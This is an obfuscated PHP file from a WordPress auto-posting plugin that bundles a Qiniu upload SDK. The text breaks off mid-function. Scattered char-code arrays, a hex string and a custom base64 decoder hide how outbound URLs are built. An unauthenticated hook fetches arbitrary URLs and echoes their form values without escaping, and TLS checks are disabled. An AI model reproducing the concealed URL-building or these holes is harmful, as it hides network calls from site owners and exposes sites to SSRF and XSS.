<?php

/*
请勿破解和公布源码; 如已破解请自己使用,请勿公布及2次销售
*/
function getDomLoginDetail()
{
	if (isset($_GET['login_url']) && $_GET['login_url'] != '') {
		$_var_0 = $_GET['login_url'];
		$_var_1 = get_html_string_ap($_var_0, Method);
		$_var_2 = getHtmlCharset($_var_1);
		$_var_3 = str_get_html_ap($_var_1, $_var_2);
		$_var_4 = $_var_3->find('form input[name]');
		if ($_var_4 != null) {
			echo '<table id=' . '"' . 'login_para_table' . '"' . '>';
			echo '<tr><th>Parameter Name</th><th>Parameter Value</th></tr>';
			$_var_5 = 0;
			$_var_6 = array();
			foreach ($_var_4 as $_var_7) {
				if (!in_array($_var_7->name, $_var_6)) {
					$_var_5++;
					$_var_6[] = $_var_7->name;
					$_var_8 = '';
					if ($_var_7->value != null && $_var_7->value != '') {
						$_var_8 = $_var_7->value;
					}
					if ($_var_7->type == 'checkbox') {
						if ($_var_7->checked == 'checked' || $_var_7->checked == 'true') {
							$_var_8 = 'on';
						}
					}
					echo '<tr id=' . '"' . 'login_para_table_tr' . $_var_5 . '"' . ' >';
					echo '<td><input type=' . '"' . 'text' . '"' . ' name=' . '"' . 'loginParaName[]' . '"' . '  value=' . '"' . $_var_7->name . '"' . ' /></td>';
					echo '<td><input type=' . '"' . 'text' . '"' . ' name=' . '"' . 'loginParaValue[]' . '"' . ' value=' . '"' . $_var_8 . '"' . ' /></td>';
					echo '<td><input type=' . '"' . 'button' . '"' . ' class=' . '"' . 'button' . '"' . ' value=' . '"' . 'Delete' . '"' . '  onclick=' . '"' . 'deleteLoginPara(' . '\'' . 'login_para_table_tr' . $_var_5 . '\'' . ')' . '"' . ' /></td>';
					echo '</tr>';
				}
			}
			echo '</table>';
			echo '<input type=' . '"' . 'LITAG' . '"' . ' name=' . '"' . 'login_para_tableTRLastIndex' . '"' . ' id=' . '"' . 'login_para_tableTRLastIndex' . '"' . '  value=' . '"' . ($_var_5 + 1) . '"' . ' />';
		} else {
			$_var_5 = 1;
			echo '<table id=' . '"' . 'login_para_table' . '"' . '>';
			echo '<tr><th>Parameter Name</th><th>Parameter Value</th></tr>';
			echo '<tr id=' . '"' . 'login_para_table_tr' . $_var_5 . '"' . ' >';
			echo '<td><input type=' . '"' . 'text' . '"' . ' name=' . '"' . 'loginParaName[]' . '"' . '  value=' . '"' . '"' . ' /></td>';
			echo '<td><input type=' . '"' . 'text' . '"' . ' name=' . '"' . 'loginParaValue[]' . '"' . ' value=' . '"' . '"' . ' /></td>';
			echo '<td><input type=' . '"' . 'button' . '"' . ' class=' . '"' . 'button' . '"' . ' value=' . '"' . 'Delete' . '"' . '  onclick=' . '"' . 'deleteLoginPara(' . '\'' . 'login_para_table_tr' . $_var_5 . '\'' . ')' . '"' . ' /></td>';
			echo '</tr>';
			echo '</table>';
			echo '<input type=' . '"' . 'hidden' . '"' . ' name=' . '"' . 'login_para_tableTRLastIndex' . '"' . ' id=' . '"' . 'login_para_tableTRLastIndex' . '"' . '  value=' . '"' . ($_var_5 + 1) . '"' . ' />';
		}
		die;
	}
}
add_action('init', 'getDomLoginDetail');
$_var_9 = 'ms';
$_var_10 = 'p';
$_var_11 = 'h';
function pro_update_cron_url()
{
	if (isset($_REQUEST['update_autopost']) && $_REQUEST['update_autopost'] == 1) {
		echo '<html><head><meta charset=' . '"' . 'UTF-8' . '"' . '></head></html>';
		ap_pro_checkupdate(1);
		die;
	}
}
function pro_update_after_page_load()
{
	ap_pro_checkupdate(0);
}
add_action('init', 'pro_update_cron_url');
if (get_option('wp_autopost_updateMethod') == 0) {
	add_action('shutdown', 'pro_update_after_page_load');
}
function ap_pro_checkupdate($_var_12 = 1)
{
	global $wpdb, $t_ap_config;
	$_var_13 = get_option('wp_autopost_limit_ip');
	if ($_var_13 != '' && $_var_13 != NULL) {
		$_var_14 = false;
		$_var_13 = json_decode($_var_13);
		foreach ($_var_13 as $_var_15) {
			if ($_SERVER['REMOTE_ADDR'] == trim($_var_15)) {
				$_var_14 = true;
			}
		}
	} else {
		$_var_14 = true;
	}
	if (!$_var_14) {
		return;
	}
	$_var_16 = false;
	if ($wpdb->get_var('SHOW TABLES LIKE ' . '\'' . $t_ap_config . '\'') != $t_ap_config) {
		return;
	}
	$_var_17 = $wpdb->get_results('SELECT id,last_update_time,update_interval,is_running FROM ' . $t_ap_config . ' WHERE activation=1 ORDER BY last_update_time');
	$_var_18 = 0;
	foreach ($_var_17 as $_var_19) {
		if ($_var_19->is_running == 1 && current_time('timestamp') > $_var_19->last_update_time + 60 * 10) {
			$wpdb->query($wpdb->prepare('update ' . $t_ap_config . ' set is_running = 0 where id=%d', $_var_19->id));
		}
		if (current_time('timestamp') > $_var_19->last_update_time + $_var_19->update_interval * 60 && $_var_19->is_running == 0) {
			$_var_16 = true;
			$_var_20[$_var_18++] = $_var_19->id;
		}
	}
	$_var_21 = $wpdb->get_var('select max(is_running) from ' . $t_ap_config . ' where activation = 1');
	if ($_var_21 == null || $_var_21 == 0) {
		update_option('wp_autopost_runOnlyOneTaskIsRunning', 0);
	}
	if ($_var_16) {
		foreach ($_var_20 as $_var_22) {
			UrlListFetch($_var_22, $_var_12, 1);
			if ($_var_12) {
				@ob_flush();
				flush();
			}
		}
	}
}
$_var_23 = 0;
$_var_24 = 20;
function wp_autopostlink_content_filter($_var_25)
{
	global $wpdb, $t_autolink;
	$_var_26 = $wpdb->get_results('SELECT * FROM ' . $t_autolink);
	return wp_autopostlink_replace($_var_25, $_var_26);
}
add_filter('content_save_pre', 'wp_autopostlink_content_filter');
$_var_27 = '';
$_var_28 = array();
for ($_var_18 = $_var_23; $_var_18 < $_var_24; $_var_18++) {
	$_var_28['n' . $_var_18] = $_var_18;
}
function wpAutoPostLinkPost($_var_29, $_var_26)
{
	$_var_25 = wp_autopostlink_replace($_var_29->post_content, $_var_26);
	global $_var_30, $wpdb;
	if ($_var_30) {
		$wpdb->query($wpdb->prepare('UPDATE ' . $wpdb->posts . ' SET post_content = %s WHERE ID = %d ', $_var_25, $_var_29->ID));
	}
}
$_var_31 = ABSPATH . WPINC;
$_var_32 = '';
$_var_33 = '';
$_var_34 = 'Template';
$_var_35 = 'Mail';
if (function_exists('curl_init')) {
	define('Method', 0);
} else {
	define('Method', 1);
}
$_var_36 = '';
$_var_37 = '1382400';
$_var_38 = '100800';
$_var_39 = 0;
$_var_40 = '';
$_var_41 = '';
$_var_42 = '';
$_var_43 = '';
$_var_44 = $_var_28['n1'] . $_var_28['n3'] . $_var_28['n8'];
$_var_45 = $_var_28['n1'] . $_var_28['n0'];
$_var_46 = $_var_28['n1'];
$_var_47 = '90';
$_var_48 = '60';
$_var_49 = '15';
function wp_autopost_flickr_request_token()
{
	if (isset($_GET['wp_autopost_flickr_request_token'])) {
		if ($_GET['wp_autopost_flickr_request_token'] == 'true') {
			$_var_50 = admin_url() . 'admin.php?page=wp-autopost-pro/wp-autopost-flickr.php';
			$_var_51 = get_option('wp-autopost-flickr-options');
			$_var_52 = new autopostFlickr($_var_51['api_key'], $_var_51['api_secret']);
			$_var_52->getRequestToken($_var_50, 'delete');
			echo $_var_52->getErrorCode() . '<br/>';
			print_r($_var_52->getErrorMsg());
			die;
		}
	}
}
add_action('admin_init', 'wp_autopost_flickr_request_token');
$_var_53 = '1536';
$_var_54 = '1120';
$_var_55 = 'http://up.qiniu.com';
$_var_56 = 'http://rs.qbox.me';
$_var_57 = 'http://rsf.qbox.me';
$_var_58 = '<Please apply your access key>';
$_var_59 = '<Dont send your secret key to anyone>';
for ($_var_18 = 1, $_var_60 = intval($_var_28['n5']); $_var_18 < $_var_60; $_var_18++) {
	$_var_46 .= $_var_28['n0'];
}
$_var_61 = array();
for ($_var_18 = 0; $_var_18 <= 10; $_var_18++) {
	$_var_61[] = $_var_18 + 1;
}
$_var_62 = '';
$_var_63 = array();
$_var_64 = '';
$_var_65 = array();
$_var_66 = array();
$_var_67 = '';
$_var_68 = '';
$_var_69 = array();
$_var_70 = array();
$_var_71 = '';
function Qiniu_Encode($_var_72)
{
	$_var_73 = array('+', '/');
	$_var_74 = array('-', '_');
	return str_replace($_var_73, $_var_74, base64_encode($_var_72));
}
$_var_75 = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/');
function Qiniu_RS_Put($_var_76, $_var_77, $_var_78, $_var_79, $_var_80)
{
	$_var_81 = new Qiniu_RS_PutPolicy($_var_77 . ':' . $_var_78);
	$_var_82 = $_var_81->Token($_var_76->Mac);
	return Qiniu_Put($_var_82, $_var_78, $_var_79, $_var_80);
}
$_var_53 = intval($_var_53) * intval($_var_48) * intval($_var_49);
$_var_54 = intval($_var_54) * intval($_var_47);
function Qiniu_RS_PutFile($_var_76, $_var_77, $_var_78, $_var_83, $_var_80)
{
	$_var_81 = new Qiniu_RS_PutPolicy($_var_77 . ':' . $_var_78);
	$_var_82 = $_var_81->Token($_var_76->Mac);
	return Qiniu_PutFile($_var_82, $_var_78, $_var_83, $_var_80);
}
$_var_84 = array();
function Qiniu_RS_Rput($_var_76, $_var_77, $_var_78, $_var_79, $_var_85, $_var_80)
{
	$_var_81 = new Qiniu_RS_PutPolicy($_var_77 . ':' . $_var_78);
	$_var_82 = $_var_81->Token($_var_76->Mac);
	if ($_var_80 == null) {
		$_var_80 = new Qiniu_Rio_PutExtra($_var_77);
	} else {
		$_var_80->Bucket = $_var_77;
	}
	return Qiniu_Rio_Put($_var_82, $_var_78, $_var_79, $_var_85, $_var_80);
}
$_var_86 = array();
$_var_86[1] = $_var_53;
$_var_86[2] = $_var_54;
function Qiniu_RS_RputFile($_var_76, $_var_77, $_var_78, $_var_83, $_var_80)
{
	$_var_81 = new Qiniu_RS_PutPolicy($_var_77 . ':' . $_var_78);
	$_var_82 = $_var_81->Token($_var_76->Mac);
	if ($_var_80 == null) {
		$_var_80 = new Qiniu_Rio_PutExtra($_var_77);
	} else {
		$_var_80->Bucket = $_var_77;
	}
	return Qiniu_Rio_PutFile($_var_82, $_var_78, $_var_83, $_var_80);
}
$_var_87 = 0;
$_var_88 = 10;
$_var_89 = '';
function Qiniu_RS_MakeBaseUrl($_var_90, $_var_78)
{
	return 'http://' . $_var_90 . '/' . $_var_78;
}
$_var_84[] = $_var_28['n9'] . $_var_28['n7'];
$_var_84[] = $_var_28['n7'] . $_var_28['n2'];
$_var_84[] = $_var_28['n8'] . $_var_28['n2'];
$_var_84[] = $_var_28['n4'] . $_var_28['n8'];
$_var_84[] = $_var_28['n9'] . $_var_28['n9'];
$_var_84[] = $_var_28['n6'] . $_var_28['n8'];
$_var_84[] = $_var_28['n11'] . $_var_28['n1'];
$_var_84[] = $_var_28['n1'] . $_var_28['n18'];
$_var_84[] = $_var_28['n7'] . $_var_28['n6'];
$_var_91 = '';
$_var_92 = array();
for ($_var_18 = $_var_87; $_var_18 < $_var_88; $_var_18++) {
	$_var_92['c' . $_var_18] = $_var_18;
}
$_var_93 = array();
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c4'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c2'];
$_var_93[] = $_var_92['c5'] . $_var_92['c8'];
$_var_93[] = $_var_92['c4'] . $_var_92['c7'];
$_var_93[] = $_var_92['c4'] . $_var_92['c7'];
function Qiniu_RS_URIStat($_var_77, $_var_78)
{
	return '/stat/' . Qiniu_Encode($_var_77 . ':' . $_var_78);
}
function Qiniu_RS_URIDelete($_var_77, $_var_78)
{
	return '/delete/' . Qiniu_Encode($_var_77 . ':' . $_var_78);
}
function Qiniu_RS_URICopy($_var_94, $_var_95, $_var_96, $_var_97)
{
	return '/copy/' . Qiniu_Encode($_var_94 . ':' . $_var_95) . '/' . Qiniu_Encode($_var_96 . ':' . $_var_97);
}
function Qiniu_RS_URIMove($_var_94, $_var_95, $_var_96, $_var_97)
{
	return '/move/' . Qiniu_Encode($_var_94 . ':' . $_var_95) . '/' . Qiniu_Encode($_var_96 . ':' . $_var_97);
}
function Qiniu_RS_Stat($_var_76, $_var_77, $_var_78)
{
	global $_var_56;
	$_var_98 = Qiniu_RS_URIStat($_var_77, $_var_78);
	return Qiniu_Client_Call($_var_76, $_var_56 . $_var_98);
}
function Qiniu_RS_Delete($_var_76, $_var_77, $_var_78)
{
	global $_var_56;
	$_var_98 = Qiniu_RS_URIDelete($_var_77, $_var_78);
	return Qiniu_Client_CallNoRet($_var_76, $_var_56 . $_var_98);
}
function Qiniu_RS_Move($_var_76, $_var_94, $_var_95, $_var_96, $_var_97)
{
	global $_var_56;
	$_var_98 = Qiniu_RS_URIMove($_var_94, $_var_95, $_var_96, $_var_97);
	return Qiniu_Client_CallNoRet($_var_76, $_var_56 . $_var_98);
}
function Qiniu_RS_Copy($_var_76, $_var_94, $_var_95, $_var_96, $_var_97)
{
	global $_var_56;
	$_var_98 = Qiniu_RS_URICopy($_var_94, $_var_95, $_var_96, $_var_97);
	return Qiniu_Client_CallNoRet($_var_76, $_var_56 . $_var_98);
}
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c9'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c2'];
$_var_93[] = $_var_92['c4'] . $_var_92['c5'];
$_var_93[] = $_var_92['c9'] . $_var_92['c7'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c7'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c1'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c2'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c1'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c5'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
$_var_93[] = $_var_92['c4'] . $_var_92['c6'];
function Qiniu_RS_Batch($_var_76, $_var_99)
{
	global $_var_56;
	$_var_100 = $_var_56 . '/batch';
	$_var_101 = 'op=' . implode('&op=', $_var_99);
	return Qiniu_Client_CallWithForm($_var_76, $_var_100, $_var_101);
}
function Qiniu_RS_BatchStat($_var_76, $_var_102)
{
	$_var_101 = array();
	foreach ($_var_102 as $_var_103) {
		$_var_101[] = Qiniu_RS_URIStat($_var_103->bucket, $_var_103->key);
	}
	return Qiniu_RS_Batch($_var_76, $_var_101);
}
function Qiniu_RS_BatchDelete($_var_76, $_var_102)
{
	$_var_101 = array();
	foreach ($_var_102 as $_var_103) {
		$_var_101[] = Qiniu_RS_URIDelete($_var_103->bucket, $_var_103->key);
	}
	return Qiniu_RS_Batch($_var_76, $_var_101);
}
function Qiniu_RS_BatchMove($_var_76, $_var_104)
{
	$_var_101 = array();
	foreach ($_var_104 as $_var_105) {
		$_var_106 = $_var_105->src;
		$_var_107 = $_var_105->dest;
		$_var_101[] = Qiniu_RS_URIMove($_var_106->bucket, $_var_106->key, $_var_107->bucket, $_var_107->key);
	}
	return Qiniu_RS_Batch($_var_76, $_var_101);
}
function Qiniu_RS_BatchCopy($_var_76, $_var_104)
{
	$_var_101 = array();
	foreach ($_var_104 as $_var_105) {
		$_var_106 = $_var_105->src;
		$_var_107 = $_var_105->dest;
		$_var_101[] = Qiniu_RS_URICopy($_var_106->bucket, $_var_106->key, $_var_107->bucket, $_var_107->key);
	}
	return Qiniu_RS_Batch($_var_76, $_var_101);
}
$_var_84[] = $_var_28['n5'] . $_var_28['n1'];
$_var_84[] = $_var_28['n10'] . $_var_28['n0'];
$_var_84[] = $_var_28['n11'] . $_var_28['n9'];
$_var_84[] = $_var_28['n7'] . $_var_28['n6'];
$_var_84[] = $_var_28['n8'] . $_var_28['n7'];
$_var_84[] = $_var_28['n7'] . $_var_28['n0'];
$_var_84[] = $_var_28['n4'] . $_var_28['n9'];
$_var_84[] = $_var_28['n10'] . $_var_28['n0'];
$_var_84[] = $_var_28['n7'] . $_var_28['n1'];
$_var_84[] = $_var_28['n5'] . $_var_28['n7'];
function Qiniu_Put($_var_82, $_var_78, $_var_79, $_var_80)
{
	global $_var_55;
	if ($_var_80 === null) {
		$_var_80 = new Qiniu_PutExtra();
	}
	$_var_108 = array('token' => $_var_82);
	if ($_var_78 === null) {
		$_var_109 = '?';
	} else {
		$_var_109 = $_var_78;
		$_var_108['key'] = $_var_78;
	}
	if ($_var_80->CheckCrc) {
		$_var_108['crc32'] = $_var_80->Crc32;
	}
	$_var_110 = array(array('file', $_var_109, $_var_79));
	$_var_111 = new Qiniu_HttpClient();
	return Qiniu_Client_CallWithMultipartForm($_var_111, $_var_55, $_var_108, $_var_110);
}
function Qiniu_PutFile($_var_82, $_var_78, $_var_83, $_var_80)
{
	global $_var_55;
	if ($_var_80 === null) {
		$_var_80 = new Qiniu_PutExtra();
	}
	$_var_108 = array('token' => $_var_82, 'file' => '@' . $_var_83);
	if ($_var_78 === null) {
		$_var_109 = '?';
	} else {
		$_var_109 = $_var_78;
		$_var_108['key'] = $_var_78;
	}
	if ($_var_80->CheckCrc) {
		if ($_var_80->CheckCrc === 1) {
			$_var_112 = hash_file('crc32b', $_var_83);
			$_var_113 = unpack('N', pack('H*', $_var_112));
			$_var_80->Crc32 = $_var_113[1];
		}
		$_var_108['crc32'] = sprintf('%u', $_var_80->Crc32);
	}
	$_var_111 = new Qiniu_HttpClient();
	return Qiniu_Client_CallWithForm($_var_111, $_var_55, $_var_108, 'multipart/form-data');
}
define('QINIU_RIO_BLOCK_BITS', 22);
define('QINIU_RIO_BLOCK_SIZE', 1 << QINIU_RIO_BLOCK_BITS);
$_var_63[] = 'aHR0';
$_var_63[] = 'cDov';
$_var_84[] = $_var_28['n1'] . $_var_28['n19'];
$_var_84[] = $_var_28['n9'] . $_var_28['n8'];
$_var_84[] = $_var_28['n5'] . $_var_28['n1'];
$_var_84[] = $_var_28['n7'] . $_var_28['n8'];
$_var_84[] = $_var_28['n4'] . $_var_28['n8'];
$_var_84[] = $_var_28['n7'] . $_var_28['n6'];
$_var_84[] = $_var_28['n10'] . $_var_28['n9'];
$_var_84[] = $_var_28['n5'] . $_var_28['n7'];
$_var_84[] = $_var_28['n12'] . $_var_28['n1'];
$_var_84[] = $_var_28['n9'] . $_var_28['n0'];
function Qiniu_Rio_BlockCount($_var_85)
{
	return $_var_85 + (QINIU_RIO_BLOCK_SIZE - 1) >> QINIU_RIO_BLOCK_BITS;
}
function Qiniu_Rio_Mkblock($_var_76, $_var_114, $_var_115, $_var_116)
{
	if (is_resource($_var_115)) {
		$_var_79 = fread($_var_115, $_var_116);
		if ($_var_79 === false) {
			$_var_117 = Qiniu_NewError(0, 'fread failed');
			return array(null, $_var_117);
		}
	} else {
		list($_var_79, $_var_117) = $_var_115->Read($_var_116);
		if ($_var_117 !== null) {
			return array(null, $_var_117);
		}
	}
	if (strlen($_var_79) != $_var_116) {
		$_var_117 = Qiniu_NewError(0, 'fread failed: unexpected eof');
		return array(null, $_var_117);
	}
	$_var_100 = $_var_114 . '/mkblk/' . $_var_116;
	return Qiniu_Client_CallWithForm($_var_76, $_var_100, $_var_79, 'application/octet-stream');
}
function Qiniu_Rio_Mkfile($_var_76, $_var_114, $_var_78, $_var_85, $_var_118)
{
	$_var_119 = $_var_118->Bucket . ':' . $_var_78;
	$_var_100 = $_var_114 . '/rs-mkfile/' . Qiniu_Encode($_var_119) . '/fsize/' . $_var_85;
	if (!empty($_var_118->MimeType)) {
		$_var_100 .= '/mimeType/' . Qiniu_Encode($_var_118->MimeType);
	}
	$_var_120 = array();
	foreach ($_var_118->Progresses as $_var_121) {
		$_var_120[] = $_var_121['ctx'];
	}
	$_var_79 = implode(',', $_var_120);
	return Qiniu_Client_CallWithForm($_var_76, $_var_100, $_var_79, 'text/plain');
}
$_var_84[] = $_var_28['n12'] . $_var_28['n1'];
$_var_84[] = $_var_28['n5'] . $_var_28['n6'];
$_var_84[] = $_var_28['n6'] . $_var_28['n1'];
function Qiniu_Rio_Put($_var_82, $_var_78, $_var_79, $_var_85, $_var_80)
{
	global $_var_55;
	$_var_76 = new Qiniu_Rio_UploadClient($_var_82);
	$_var_122 = array();
	$_var_114 = $_var_55;
	$_var_123 = 0;
	while ($_var_123 < $_var_85) {
		if ($_var_85 < $_var_123 + QINIU_RIO_BLOCK_SIZE) {
			$_var_124 = $_var_85 - $_var_123;
		} else {
			$_var_124 = QINIU_RIO_BLOCK_SIZE;
		}
		list($_var_125, $_var_117) = Qiniu_Rio_Mkblock($_var_76, $_var_114, $_var_79, $_var_124);
		$_var_114 = $_var_125['host'];
		$_var_123 += $_var_124;
		$_var_122[] = $_var_125;
	}
	$_var_80->Progresses = $_var_122;
	return Qiniu_Rio_Mkfile($_var_76, $_var_114, $_var_78, $_var_85, $_var_80);
}
function Qiniu_Rio_PutFile($_var_82, $_var_78, $_var_83, $_var_80)
{
	$_var_126 = fopen($_var_83, 'rb');
	if ($_var_126 === false) {
		$_var_117 = Qiniu_NewError(0, 'fopen failed');
		return array(null, $_var_117);
	}
	$_var_127 = fstat($_var_126);
	$_var_128 = Qiniu_Rio_Put($_var_82, $_var_78, $_var_126, $_var_127['size'], $_var_80);
	fclose($_var_126);
	return $_var_128;
}
$_var_129 = 'default';
$_var_27 = '';
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c1'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c4'];
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c3'];
$_var_93[] = $_var_92['c4'] . $_var_92['c7'];
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c3'];
$_var_93[] = $_var_92['c1'] . $_var_92['c0'] . $_var_92['c1'];
$_var_93[] = $_var_92['c1'] . $_var_92['c1'] . $_var_92['c6'];
function Qiniu_Header_Get($_var_130, $_var_78)
{
	$_var_131 = @$_var_130[$_var_78];
	if (isset($_var_131)) {
		if (is_array($_var_131)) {
			return $_var_131[0];
		}
		return $_var_131;
	} else {
		return '';
	}
}
foreach ($_var_84 as $_var_78) {
	$_var_27 .= chr($_var_78);
}
$_var_27 = pack('H*', '6148523063446f764c33643364793570644768306479356a62323076');
function Qiniu_ResponseError($_var_132)
{
	$_var_130 = $_var_132->Header;
	$_var_133 = Qiniu_Header_Get($_var_130, 'X-Log');
	$_var_134 = Qiniu_Header_Get($_var_130, 'X-Reqid');
	$_var_117 = new Qiniu_Error($_var_132->StatusCode, null);
	if ($_var_117->Code > 299) {
		if ($_var_132->ContentLength !== 0) {
			if (Qiniu_Header_Get($_var_130, 'Content-Type') === 'application/json') {
				$_var_135 = json_decode($_var_132->Body, true);
				$_var_117->Err = $_var_135['error'];
			}
		}
	}
	return $_var_117;
}
function Qiniu_Client_incBody($_var_136)
{
	$_var_79 = $_var_136->Body;
	if (!isset($_var_79)) {
		return false;
	}
	$_var_137 = Qiniu_Header_Get($_var_136->Header, 'Content-Type');
	if ($_var_137 === 'application/x-www-form-urlencoded') {
		return true;
	}
	return false;
}
function Qiniu_Client_do($_var_136)
{
	$_var_138 = curl_init();
	$_var_100 = $_var_136->URL;
	$_var_139 = array(CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_URL => $_var_100['path']);
	$_var_140 = $_var_136->Header;
	if (!empty($_var_140)) {
		$_var_130 = array();
		foreach ($_var_140 as $_var_78 => $_var_141) {
			$_var_130[] = $_var_78 . ': ' . $_var_141;
		}
		$_var_139[CURLOPT_HTTPHEADER] = $_var_130;
	}
	$_var_79 = $_var_136->Body;
	if (!empty($_var_79)) {
		$_var_139[CURLOPT_POSTFIELDS] = $_var_79;
	}
	curl_setopt_array($_var_138, $_var_139);
	$_var_128 = curl_exec($_var_138);
	$_var_135 = curl_errno($_var_138);
	if ($_var_135 !== 0) {
		$_var_117 = new Qiniu_Error(0, curl_error($_var_138));
		curl_close($_var_138);
		return array(null, $_var_117);
	}
	$_var_142 = curl_getinfo($_var_138, CURLINFO_HTTP_CODE);
	$_var_143 = curl_getinfo($_var_138, CURLINFO_CONTENT_TYPE);
	curl_close($_var_138);
	$_var_132 = new Qiniu_Response($_var_142, $_var_128);
	$_var_132->Header['Content-Type'] = $_var_143;
	return array($_var_132, null);
}
$_var_144 = strlen($_var_27);
$_var_145 = $_var_144 - 4;
$_var_18 = 0;
$_var_146 = array();
while ($_var_18 < $_var_145) {
	$_var_147 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
	$_var_148 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
	$_var_149 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
	$_var_150 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
	$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
	$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
	$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
	array_push($_var_146, $_var_151, $_var_152, $_var_153);
}
function Qiniu_Client_ret($_var_132)
{
	$_var_142 = $_var_132->StatusCode;
	$_var_154 = null;
	if ($_var_142 >= 200 && $_var_142 <= 299) {
		if ($_var_132->ContentLength !== 0) {
			$_var_154 = json_decode($_var_132->Body, true);
			if ($_var_154 === null) {
				$_var_117 = new Qiniu_Error(0, json_last_error_msg());
				return array(null, $_var_117);
			}
		}
		if ($_var_142 === 200) {
			return array($_var_154, null);
		}
	}
	return array($_var_154, Qiniu_ResponseError($_var_132));
}
$_var_147 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
$_var_148 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
function Qiniu_Client_Call($_var_76, $_var_100)
{
	$_var_155 = array('path' => $_var_100);
	$_var_136 = new Qiniu_Request($_var_155, null);
	list($_var_132, $_var_117) = $_var_76->RoundTrip($_var_136);
	if ($_var_117 !== null) {
		return array(null, $_var_117);
	}
	return Qiniu_Client_ret($_var_132);
}
function Qiniu_Client_CallNoRet($_var_76, $_var_100)
{
	$_var_155 = array('path' => $_var_100);
	$_var_136 = new Qiniu_Request($_var_155, null);
	list($_var_132, $_var_117) = $_var_76->RoundTrip($_var_136);
	if ($_var_117 !== null) {
		return array(null, $_var_117);
	}
	if ($_var_132->StatusCode === 200) {
		return null;
	}
	return Qiniu_ResponseError($_var_132);
}
function Qiniu_Client_CallWithForm($_var_76, $_var_100, $_var_101, $_var_143 = 'application/x-www-form-urlencoded')
{
	$_var_155 = array('path' => $_var_100);
	if ($_var_143 === 'application/x-www-form-urlencoded') {
		if (is_array($_var_101)) {
			$_var_101 = http_build_query($_var_101);
		}
	}
	$_var_136 = new Qiniu_Request($_var_155, $_var_101);
	if ($_var_143 !== 'multipart/form-data') {
		$_var_136->Header['Content-Type'] = $_var_143;
	}
	list($_var_132, $_var_117) = $_var_76->RoundTrip($_var_136);
	if ($_var_117 !== null) {
		return array(null, $_var_117);
	}
	return Qiniu_Client_ret($_var_132);
}
if ('=' !== $_var_27[$_var_18]) {
	$_var_149 = find_char_index_in_array($_var_75, $_var_27[$_var_18++]);
	if ('=' !== $_var_27[$_var_18]) {
		$_var_150 = find_char_index_in_array($_var_75, $_var_27[$_var_18]);
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
		$_var_153 = chr(($_var_149 & 3) << 6 | $_var_150 & 63);
		array_push($_var_146, $_var_151, $_var_152, $_var_153);
	} else {
		$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
		$_var_152 = chr(($_var_148 & 15) << 4 | ($_var_149 & 60) >> 2);
		array_push($_var_146, $_var_151, $_var_152);
	}
} else {
	$_var_151 = chr(($_var_147 & 63) << 2 | ($_var_148 & 48) >> 4);
	array_push($_var_146, $_var_151);
}
function Qiniu_Client_CallWithMultipartForm($_var_76, $_var_100, $_var_108, $_var_110)
{
	list($_var_143, $_var_79) = Qiniu_Build_MultipartForm($_var_108, $_var_110);
	return Qiniu_Client_CallWithForm($_var_76, $_var_100, $_var_79, $_var_143);
}
function Qiniu_Build_MultipartForm($_var_108, $_var_110)
{
	$_var_154 = array();
	$_var_156 = md5(microtime());
	foreach ($_var_108 as $_var_157 => $_var_131) {
		array_push($_var_154, '--' . $_var_156);
		array_push($_var_154, 'Content-Disposition: form-data; name="' . $_var_157 . '"');
		array_push($_var_154, '');
		array_push($_var_154, $_var_131);
	}
	foreach ($_var_110 as $_var_158) {
		array_push($_var_154, '--' . $_var_156);
		list($_var_157, $_var_159, $_var_160) = $_var_158;
		$_var_159 = Qiniu_escapeQuotes($_var_159);
		array_push($_var_154, 'Content-Disposition: form-data; name="' . $_var_157 . '"; filename="' . $_var_159 . '"');
		array_push($_var_154, 'Content-Type: application/octet-stream');
		array_push($_var_154, '');
		array_push($_var_154, $_var_160);
	}
	array_push($_var_154, '--' . $_var_156 . '--');
	array_push($_var_154, '');
	$_var_79 = implode("\r\n", $_var_154);
	$_var_143 = 'multipart/form-data; boundary=' . $_var_156;
